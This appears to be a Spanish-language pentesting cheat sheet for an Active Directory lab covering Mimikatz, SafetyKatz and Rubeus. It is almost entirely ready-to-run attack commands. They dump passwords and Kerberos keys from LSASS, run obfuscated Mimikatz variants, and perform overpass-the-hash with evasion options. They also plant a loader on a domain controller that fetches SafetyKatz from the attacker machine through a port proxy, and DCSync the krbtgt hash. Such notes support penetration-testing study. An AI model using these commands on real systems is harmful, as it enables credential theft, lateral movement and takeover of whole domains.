# Mimikatz

Tags: #AD #Windows #Mimikatz #Powershell #Rubeus 

* [Mimikatz](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/kali/master/x64?ref_type=heads)

**Mimikatz** es una herramienta post-explotación utilizada para:  
- Extraer credenciales de memoria  
- Abusar de mecanismos de autenticación en Windows  
- Manipular tickets de Kerberos
Además de, obtener acceso a credenciales para escalar privilegios o moverse lateralmente en la red.

## Runas 

```powershell 
! Usuario de dominio (AD) 

# Abrir una nueva consola (cmd) usando credenciales de dominio solo para autenticación en red, mientras la sesión local sigue siendo el usuario actual
❯ runas /user:domain\user /netonly cmd       
```

## Credential Extration - LSASS

```powershell 
! Usuario local con permisos de Administrador 

# Extraer desde LSASS las claves de cifrado Kerberos (AES, RC4, etc.) de las sesiones de usuarios en el sistema.
❯ .\mimikatz.exe -Command '"sekurlsa::ekeys"'  
❯ .\mimikatz.exe -Command '"sekurlsa::logonpasswords"'  

# Ejecutar una versión modificada de Mimikatz (SafetyKatz) para extraer desde LSASS las claves Kerberos (AES, RC4, etc.) de los usuarios en memoria 
❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-keys" exit      
❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-logonPasswords" exit

❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-logonpasswords" "exit" 

❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-keys" "exit" 

Notes: 
	1. Desde Kali se puede usar la herramienta de impacket 
```

```powershell 
! Usuario local con permisos de Administrador

❯ .\Invoke-Mimi.ps1   # Script ligero 

# Versión ofuscada    
❯ .\Invoke-MimiEx-keys.ps1         # Ejecutar sekurlsa::ekeys 
❯ .\Invoke-MimiEx-vault.ps1        # Ejecutar vault::cred /patch 
```

## OverPass The Hash 

```powershell 
! Usuario local con permisos de Administrador

# Ejecutar Pass-the-Key (Overpass-the-Hash) usando una clave AES256 Kerberos, creando una nueva cmd.exe autenticada como el usuario administrador
❯ .\SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: domain1.local /aes256:<aes256keys> /run:cmd.exe" "exit"     

Notes: 
	1. The above commands starts a process with a logon type 9 (same as runas /netonly) 
```

## OverPass The Hash - Rubeus 

```powershell 
! Usuario de dominio (AD) con permisos de Administrador Local 

# Solicitar un Ticket Granting Ticket (TGT) de Kerberos usando el hash NTLM (RC4) del usuario y lo inyecta en la sesión actual (/ptt)
❯ .\Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

```powershell 
! Usuario de dominio (AD) con permisos de Administrador Local 

# Solicitar un TGT Kerberos usando una clave AES256 y lo inyecta en una nueva sesión (cmd.exe) creada con createnetonly, aplicando opciones más sigilosas (/opsec)
❯ .\Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 

! La mejor forma de hacerlo 
# Ejecutar Rubeus a través de un loader para solicitar un TGT Kerberos usando una clave AES256 y lo inyecta en una nueva sesión cmd.exe, aplicando opciones de evasión (/opsec)
❯ .\Loader.exe -path C:\AD\Rubeus.exe -args asktgt /user:svcadmin /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 

Notes:
	1. Over Pass The Hash (OPTH) crea un CMD con tickets Kerberos de svcadmin (usuario dado)
	2. Ejecutar comandos 
```

```powershell 
# Forma 2 de conectarse al server (Es la mejor forma de conectarse) ya que te da una Powershell 
❯ Enter-PSSession -ComputerName server01.domain01.local    # Ingresar al server donde tenemos acceso administrativo remoto
	❯ $env:username
	❯ $env:computername
```

```powershell
❯ winrs -r:dcorp-dc cmd /c set username    # Ejecutar el comando desde la nueva sesión a traves de OPtH
```

## DCSync 

```powershell 
# Compartir el Loader en la sesión (cmd) con OPTH que tiene el ticket inyectado
❯ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y    # Copiar Loader al DC desde la PC atacante
❯ winrs -r:dcorp-dc cmd     # Ingresar al server DC

# Ejecutar desde dentro del DC
❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
# Funciona para ejecutar directamente 'SafetyKatz' directamente en el DC sin descargarlo 
```

```powershell 
! Usuario de dominio (AD) con permisos de Administrador 

# Ejecutar SafetyKatz dentro del DC a través de un loader para realizar un DCSync evasivo, solicitando al Domain Controller los hashes del usuario krbtgt
❯ C:\Temp\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"   # Primer comando a ejecutar 
	# path = Indicar la ruta donde se encuentra Safetikatz de la máquina de atacante

❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"  # Segundo comando a ejecutar 
❯ .\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit" 


Nota:
	- Por defecto, se requieren privilegios de Domain Admins, Enterprise Admins o Domain Controllers para ejecutar DCSync
```